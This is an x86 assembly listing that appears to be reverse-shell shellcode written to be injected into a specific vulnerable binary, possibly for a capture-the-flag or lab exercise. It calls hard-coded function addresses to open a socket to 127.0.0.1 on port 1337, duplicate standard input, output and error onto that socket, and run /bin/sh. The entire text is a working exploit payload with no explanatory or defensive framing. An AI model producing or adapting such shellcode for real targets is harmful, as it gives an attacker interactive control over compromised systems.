sub     esp, 0x44c;                                 # to avoid overriding the shell code
push    ebp;
mov     ebp, esp;
sub     esp, 0x30;

sub     esp, 0x4;
push    0x0;                                        # protocol.
push    0x1;                                        # type.
push    0x2;                                        # family.
mov     eax, 0x08048730;
call    eax;                                        # call _socket.
add     esp, 0x10;
mov    DWORD PTR [ebp-0x28], eax;                   # save socket fd.

mov    WORD PTR [ebp-0x1c], 0x2;                    # set sockaddr.sin_family = AF_INET.

mov     eax, 0x539;
movzx   eax, ax;
sub     esp, 0xC;
push    eax;                                        # port number.
mov     eax, 0x08048640;
call    eax;                                        # call _htons;
add     esp, 0x10;
mov    WORD PTR [ebp-0x1a], ax;                     # set sockaddr.sin_port = htons(port).

sub     esp, 0xC;
JMP _WANT_IP_ADDR;
_GOT_IP_ADDR:;                                      # don't need to push because 'CALL _GOT_IP_ADDR' is already pushed the string.
mov     eax, 0x08048740;
call    eax;                                        # call _inet_addr.
add     esp, 0x10;
mov    DWORD PTR [ebp-0x18],eax;                    # set sockaddr.sin_addr.s_addr = inet_addr("127.0.0.1").

sub     esp, 0x4;
push    0x10;                                       # sizeof(sockaddr).
lea    eax,[ebp-0x1c];                              # & sockaddr.  
push    eax;
push   DWORD PTR [ebp-0x28];                        # socket fd.
mov     eax, 0x08048750;
call    eax;                                        #call _connect.

add     esp, 0x10;
sub     esp, 0x8;
push    0x0;                                        # stdin.   
push   DWORD PTR [ebp-0x28];                        # socket fd.
mov     eax, 0x08048600;
call    eax;                                        # call _dup2.
add     esp, 0x10;
sub     esp, 0x8;

push    0x1;                                        # stdout.
push   DWORD PTR [ebp-0x28];                        # socket fd.
mov     eax, 0x08048600;
call    eax;                                        # call _dup2.
add     esp, 0x10;
sub     esp, 0x8;

push    0x2;                                        # strerr.
push   DWORD PTR [ebp-0x28];                        # socket fd.
mov     eax, 0x08048600;
call    eax;                                        # call _dup2.
add     esp, 0x10;

sub     esp, 0x8;
push    0;                                          # argv = 0.                                           

JMP _WANT_BIN_BASH;
_GOT_BIN_BASH:;                                     # don't need to push because 'CALL _GOT_BIN_BASH' is already pushed the string.
mov     eax, 0x080486d0;
call    eax;                                        # call execv.

_WANT_BIN_BASH:;
CALL _GOT_BIN_BASH;
.STRING "/bin/sh";

_WANT_IP_ADDR:;
CALL _GOT_IP_ADDR;
.STRING "127.0.0.1";